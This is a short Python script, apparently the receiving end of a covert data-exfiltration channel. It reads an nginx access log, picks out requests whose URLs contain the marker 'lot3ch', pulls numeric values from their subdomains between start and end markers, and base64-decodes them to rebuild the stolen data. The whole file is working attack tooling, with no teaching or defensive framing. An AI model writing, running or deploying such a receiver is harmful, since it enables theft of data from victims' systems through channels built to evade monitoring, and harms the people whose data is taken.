import os
import argparse
import base64

def decode_exfil_data(data):
    bytes = []
    output = ''
    for url in data:
        bytes.append(url.split('.')[0][6:])
    for b in bytes:
        output += (chr(int(b)))
    return(base64.b64decode(output).decode('utf-8'))



parser = argparse.ArgumentParser(description='Receive exfiltrated data via nginx logs.')

# Argument for file path to nginx log
parser.add_argument('--file', help='Your log file storing the encoded results')

args = parser.parse_args()

# Nginx log file path
file_path = args.file

log_file = open(file_path, 'r')

logs = []
urls = []

if(log_file != None):
    for log in log_file:
        logs.append(log)

for log in logs:
    url = log.split(' ')[10]
    if("lot3ch" in url):
        urls.append(url)

important_data = []
adding_mode = False
temp_important_data = []
for url in urls:
    relevant_number = url.split('.')[0][6:]
    print(relevant_number)

    if (relevant_number == '218'):
        adding_mode = False
        important_data.append(temp_important_data)
        temp_important_data = []
    elif (adding_mode):
        temp_important_data.append(url)
    elif (relevant_number == '216'):
        adding_mode = True

for data in important_data:
    print(decode_exfil_data(data))


